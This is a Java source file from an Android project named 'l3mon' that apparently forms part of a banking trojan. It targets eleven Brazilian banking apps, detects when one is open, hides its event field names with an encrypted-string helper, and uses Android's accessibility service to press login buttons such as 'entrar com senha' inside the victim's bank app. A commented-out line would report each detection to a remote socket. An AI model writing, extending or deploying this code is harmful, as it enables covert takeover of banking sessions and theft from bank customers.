package com.etechd.l3mon.managers;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

import com.etechd.l3mon.StringCrypto;

public class ContextualManager {

    private static final Map<String, String> BANK_PACKAGES = new HashMap<>();
    private String lastDetectedBank = "";

    static {
        BANK_PACKAGES.put("itau", "com.itau");
        BANK_PACKAGES.put("bradesco", "com.bradesco");
        BANK_PACKAGES.put("caixa", "com.caixa");
        BANK_PACKAGES.put("nubank", "com.nubank");
        BANK_PACKAGES.put("bb", "com.bb");
        BANK_PACKAGES.put("santander", "com.santander");
        BANK_PACKAGES.put("inter", "br.com.inter");
        BANK_PACKAGES.put("c6", "com.c6bank");
        BANK_PACKAGES.put("next", "com.next");
        BANK_PACKAGES.put("picpay", "com.picpay");
        BANK_PACKAGES.put("neon", "com.neon");
    }

    public String detectBankApp(String foregroundPackage) {
        if (foregroundPackage == null)
            return null;

        for (Map.Entry<String, String> entry : BANK_PACKAGES.entrySet()) {
            if (foregroundPackage.contains(entry.getValue())) {
                return entry.getKey();
            }
        }
        return null;
    }

    public void onBankDetected(String bankName, AccessibilityNodeInfo root) {
        if (bankName == null || root == null)
            return;

        if (bankName.equals(lastDetectedBank))
            return;

        lastDetectedBank = bankName;

        try {
            JSONObject event = new JSONObject();
            event.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), StringCrypto.d("d/eGSd5QYxzZj6vlGx+6ig==")); // "action"
                                                                                                               // =
                                                                                                               // "bank_detected"
            event.put(StringCrypto.d("bftMHTJO9AYrI3XBQoExcQ=="), bankName.toUpperCase()); // "bank"
            event.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"

            // ConnectionManager.ioSocket.emit("0xCTX", event);

            // Ações automáticas por banco
            switch (bankName.toLowerCase()) {
                case "nubank":
                    clickIfExists(root, StringCrypto.d("+PtDcsiwOR2Tel6NTfcgGg2mX9fmfdmvTpbvcYiXm+I=")); // "entrar com
                                                                                                         // senha"
                    clickIfExists(root, StringCrypto.d("WzcU0njwTz+jAMiX2Ey3uA==")); // "usar senha"
                    break;
                case "itau":
                    clickIfExists(root, StringCrypto.d("7jEzGOjPomwHFzqpMNZnz5rpvYMvyZZA1L+hUkpCcJU=")); // "acessar com
                                                                                                         // senha"
                    clickIfExists(root, StringCrypto.d("0piUixy2F5VQ0vJknn1RFA==")); // "continuar"
                    break;
                case "bradesco":
                case "caixa":
                case "bb":
                    clickIfExists(root, StringCrypto.d("SdyeS2SaRafXFzbikNohYg==")); // "acessar"
                    clickIfExists(root, StringCrypto.d("QGMA95k6dCUrXjAbRENt9Q==")); // "entrar"
                    break;
                default:
                    clickIfExists(root, StringCrypto.d("QGMA95k6dCUrXjAbRENt9Q==")); // "entrar"
                    clickIfExists(root, StringCrypto.d("SdyeS2SaRafXFzbikNohYg==")); // "acessar"
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean clickIfExists(AccessibilityNodeInfo node, String text) {
        if (node == null)
            return false;

        String nodeText = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        String desc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";

        if ((nodeText.contains(text) || desc.contains(text)) && node.isClickable()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (clickIfExists(child, text)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    public void resetLastDetectedBank() {
        lastDetectedBank = "";
    }
}